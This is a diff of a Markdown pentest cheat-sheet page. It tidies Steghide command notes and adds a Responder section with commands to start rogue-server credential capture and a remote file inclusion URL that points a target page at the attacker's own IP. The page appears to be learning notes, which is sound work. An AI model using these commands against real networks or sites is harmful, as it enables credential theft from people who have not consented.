@@ -2,11 +2,7 @@
 
 ## <mark style="color:green;">Steghide</mark>
 
-### **Characteristics:**
-
-* Stenography Program
-
-### **Comands:**
+Stenography Program
 
 * Install
 
@@ -16,7 +12,7 @@ sudo apt-get install steghide
 ```
 {% endcode %}
 
-
+***
 
 * Shows embedded information got from a file
 
@@ -26,19 +22,15 @@ steghide info $filename
 ```
 {% endcode %}
 
-
+***
 
 * Extract embedded data from a file
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-steghide extract -sf $filename
+steghide extract -sf $filename #Get info from stego file
 ```
 {% endcode %}
-
-{% hint style="info" %}
-**Note:** Flag `-sf` specifies to get information from a stego file
-{% endhint %}
 
 
 
@@ -62,4 +54,44 @@ steghide extract -sf $filename
 * **Decoder:** Allows us to transform data, decoding captured information, or encoding a payload.
 * **Comparer:** Allows us to compare two pieces of data at either word or byte level.
 * **Sequencer:** Help us asses random tokens or other generated data.
+
+
+
+## <mark style="color:green;">Responder</mark>
+
+Help in passive obtention of credentials by mounting a SMB server in web
+
+* Configurate file
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+sudo nano /usr/share/responder/Responder.conf #Installed here by default
+```
+{% endcode %}
+
+***
+
+* Initialize Responder
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+sudo responder -I $networkinterface
+```
+{% endcode %}
+
+{% hint style="info" %}
+**Note:** If error in any port, set _off_ in the service related to that port in _Responder.conf_ file
+{% endhint %}
+
+***
+
+* Make Remote file inclusion at page
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+http://$url/$query?$value=//$myip/somefile
+```
+{% endcode %}
+
+***
 
